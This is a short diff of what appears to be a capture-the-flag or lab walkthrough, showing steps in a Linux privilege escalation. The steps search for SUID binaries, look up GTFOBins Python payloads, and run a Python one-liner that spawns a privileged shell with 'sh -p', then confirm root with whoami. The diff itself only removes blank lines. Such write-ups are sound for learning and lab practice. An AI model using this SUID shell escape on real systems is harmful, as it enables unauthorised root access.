@@ -254,9 +254,7 @@ bash-4.4$ find / -perm -u=s -type f 2>/dev/null
 /bin/umount
 ```
 25.`firefox https://gtfobins.github.io/gtfobins/python/` to launch our Mozilla Firefox web browser and direct it to the specified URL, and then search for Python payloads that would allow us to elevate our current privileges 
-
 26. `python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’` to execute a Bourne shell (sh) with elevated privileges as sudo using the Python interpreter
-
 27. `whoami` to check if we're now successfully connected as root
 ```bash
 bash-4.4$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
